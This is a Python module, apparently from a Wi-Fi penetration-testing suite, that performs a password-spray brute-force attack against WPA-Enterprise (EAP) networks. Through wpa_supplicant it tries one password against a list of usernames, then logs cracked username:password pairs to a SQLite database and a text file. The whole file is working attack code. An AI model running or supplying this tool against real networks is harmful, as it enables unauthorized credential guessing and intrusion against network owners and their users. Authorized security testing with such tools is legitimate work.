# Module: eapspray.py
# Description: Performs a Spray Brute-force attack against the Extensible Authentication Protocol (EAP)
# The Eapspray module is tailored to spray a list of usernames against a single password guess.
# Author: Nick Sanzotta/@Beamr
# Version: v 1.05162017

import os, threading, time
# WPA Supplicant required libs
from wpa_supplicant.core import WpaSupplicantDriver
from twisted.internet.selectreactor import SelectReactor
from twisted.internet import task
# Theme
from theme import *

# Database
from dbcommands import DB
# Database connection
# CHECK: needs to be relocated, used while testing database.py
import sqlite3
try:
     # Connect to Database 
     # ISSUE/TEMP hardcoded db_path
     conn = sqlite3.connect('data/WiFiSuite.db', check_same_thread=False) # KEEP Thread Support
     conn.text_factory = str # KEEP Interpret 8-bit bytestrings 
     conn.isolation_level = None # KEEP Autocommit Mode
     db = DB(conn)
except Exception as e:
     print(red('!') + 'Could not connect to database: ' +str(e))
     sys.exit(1)

class eapSpray(threading.Thread):
	def __init__(self, ssid, user, password, ca_cert, ca_path, client_cert, supplicantInt, interface):
		threading.Thread.__init__(self)
		self.setDaemon(1) # Creates Thread in daemon mode
		self.ssid = ssid
		self.user = user
		self.password = password
		self.ca_cert = ca_cert
		self.ca_path = ca_path
		self.client_cert = client_cert
		self.supplicantInt = supplicantInt
		self.interface = interface

	def run(self):
		# Time Stamp for file creation
		timestr = time.strftime("%Y%m%d-%H%M") # NOT SURE I NEED THIS ANY LONGER
		# Time Stamp for entire credential spray
		curr_time1 = time.time()
		
		# Container of successfully authenticated user
		successList = []

		while not self.user.empty():
			cls()
			banner()
			for user in self.user.get():
				# Time Stamp for each user
				curr_time2 = time.time()
				#DEBUG PRINT
				# print(colors.green +'[*]' + colors.normal + 'Testing: ' + user + ":" + password )
				network_cfg = {
				        "disabled": 0, 
				        "ssid": self.ssid,
				        "scan_ssid":1,
				        "mode": 0,
				        "key_mgmt": "WPA-EAP IEEE8021X",
				        "pairwise": "CCMP TKIP",
				        "eap": "MD5 MSCHAPV2 OTP GTC TLS PEAP TTLS",
				        "identity": user,
				        "password": self.password,
				        # "ca_cert": ca_cert,
				        # "ca_path": ca_path,
				        # "client_cert": client_cert,
				        "phase1": "peapver=0", 
				        "phase2": "auth=MSCHAPV2",	

				}	

				# Conf Added
				self.interface.add_network(network_cfg)	

				# Connect to Network Profile 0
				self.interface.select_network(self.supplicantInt+'/Networks/0')	

				# DEBUG: Print Current WPA CONF
				# print('DEBUG: WPA CONF')
				# print(interface.get_current_network())	

				while True:
					if self.interface.get_state() == 'completed':
						print(' Brute-forcing SSID : ' + ' ' + self.ssid)
						print(' Testing Credentials: ' + ' ' + user + ':' + self.password)
						print(' Interface          : ' + ' ' + self.interface.get_ifname())
						print(' Interface Status   : ' + ' ' + self.interface.get_state())
						print(' Authentication     : ' + ' Success: '+ colors.green + '[!]' + colors.normal)
						print(' Elapsed Time       :  %.1fs\n' % (time.time() - curr_time2))
						userSuccess = user + ":" + self.password
						successList.append(userSuccess)
						db.eapspray_commit(self.ssid, user, self.password)
						# Remove from associated network, which results in state: 'inactive'
						self.interface.remove_network(self.supplicantInt+'/Networks/0')
						# Wait for inactive state, based on a timer.
						time.sleep(7)
					elif self.interface.get_state() == 'disconnected':
						print(' Brute-forcing SSID : ' + ' ' + self.ssid)
						print(' Testing Credentials: ' + ' ' + user + ":" + self.password)
						print(' Interface          : ' + ' ' + self.interface.get_ifname())
						print(' Interface Status   : ' + ' ' + self.interface.get_state())
						print(' Authentication     : ' + ' Failed: '+ colors.red + '[!]' + colors.normal)
						print(' Elapsed Time       :  %.1fs\n ' % (time.time() - curr_time2))
						# Remove from associated network, which results in state: 'inactive'
						self.interface.remove_network(self.supplicantInt+'/Networks/0')
						# Wait for inactive state, based on a timer.
						time.sleep(7)
					elif self.interface.get_state() == 'inactive':
						break

			cls()
			banner()
			print(' Credentials Discovered: ')
			try:
				for users in successList:
					print(' ' + users)
					with open('data/'+self.ssid+'_'+timestr+'.txt', 'a+') as f1:
						f1.write(users+'\n')
					
			except UnboundLocalError:
				#ISSUE NOT PRINTING.
				print(colors.red + 'None: [!]' + colors.normal)	
	
			print("\n Completed Time in: %.1fs\n" % (time.time() - curr_time1))
			self.user.task_done()
